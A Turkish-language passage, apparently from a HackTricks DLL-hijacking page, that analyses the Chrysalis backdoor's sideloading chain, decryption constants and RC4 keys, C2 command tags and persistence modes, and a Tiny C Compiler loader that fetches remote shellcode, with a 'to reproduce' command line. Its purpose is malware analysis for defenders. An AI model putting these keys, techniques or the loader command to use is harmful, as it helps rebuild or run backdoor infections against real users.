- `update.exe` (NSIS) `%AppData%\Bluetooth` oluşturur, bunu **HIDDEN** olarak işaretler, yeniden adlandırılmış Bitdefender Submission Wizard `BluetoothService.exe`'yi, bir kötü amaçlı `log.dll`'i ve `BluetoothService` adlı şifrelenmiş bir blob'u bırakır, sonra EXE'yi başlatır.
- Host EXE `log.dll`'i import eder ve `LogInit`/`LogWrite`'i çağırır. `LogInit` blob'u mmap ile yükler; `LogWrite` onu özel LCG tabanlı bir akışla (sabitler **0x19660D** / **0x3C6EF35F**, anahtar malzemesi önceki bir hash'ten türetilmiş) çözer, tamponu düz metin shellcode ile yazar, geçici alanları serbest bırakır ve ona atlar.
- IAT'ten kaçınmak için loader, export isimlerini **FNV-1a basis 0x811C9DC5 + prime 0x1000193** kullanarak hash'ler, sonra Murmur tarzı bir avalanche (**0x85EBCA6B**) uygular ve tuzlu hedef hash'lerle karşılaştırır.

Ana shellcode (Chrysalis)
- Beş geçiş boyunca `gQ2JR&9;` anahtarıyla add/XOR/sub işlemlerini tekrar ederek PE-benzeri bir ana modülü çözer, sonra import çözümlemesini tamamlamak için dinamik olarak `Kernel32.dll` → `GetProcAddress`'i yükler.
- Çalışma zamanında DLL isim dizelerini karakter başına bit-rotate/XOR dönüşümleriyle yeniden oluşturur, sonra `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`'yi yükler.
- İkinci bir çözümleyici kullanır; bu çözümleyici **PEB → InMemoryOrderModuleList** üzerinde gezinir, her export tablosunu Murmur tarzı karıştırma ile 4 baytlık bloklar halinde ayrıştırır ve hash bulunmazsa yalnızca `GetProcAddress`'e döner.

Gömülü konfigürasyon & C2
- Konfigürasyon bırakılan `BluetoothService` dosyasının içinde **offset 0x30808**'de (boyut **0x980**) bulunur ve `qwhvb^435h&*7` anahtarıyla RC4 ile çözüldüğünde C2 URL'si ve User-Agent ortaya çıkar.
- Beacon'lar noktayla ayrılmış bir host profili oluşturur, başına `4Q` tag'ini ekler, sonra HTTPS üzerinden `HttpSendRequestA`'dan önce `vAuig34%^325hGV` anahtarıyla RC4 ile şifreler. Yanıtlar RC4 ile çözüldükten sonra bir tag switch tarafından yönlendirilir (`4T` shell, `4V` process exec, `4W/4X` dosya yazma, `4Y` okuma/exfil, `4\\` uninstall, `4` drive/dosya enum + parçalı transfer durumları).
- Çalıştırma modu CLI argümanlarıyla kontrol edilir: argüman yok = kalıcılık kurulumu (service/Run anahtarı) `-i`'ye işaret eder; `-i` kendini `-k` ile yeniden başlatır; `-k` kurulumu atlar ve payload'ı çalıştırır.

Gözlemlenen alternatif loader
- Aynı saldırı Tiny C Compiler bıraktı ve `C:\ProgramData\USOShared\`'ten `svchost.exe -nostdlib -run conf.c` komutunu çalıştırdı, yanında `libtcc.dll` vardı. Saldırgan tarafından sağlanan C kaynağı içine gömülmüş shellcode'u derledi ve bir PE ile diske dokunmadan hafızada çalıştırdı. Tekrarlamak için:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Bu TCC-based compile-and-run aşaması çalışma zamanında `Wininet.dll`'i yükledi ve sabit kodlu bir URL'den ikinci aşama shellcode çekti; derleyici çalıştırması gibi görünen esnek bir loader sağladı.

## Referanslar

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)


{{#include ../../../banners/hacktricks-training.md}}
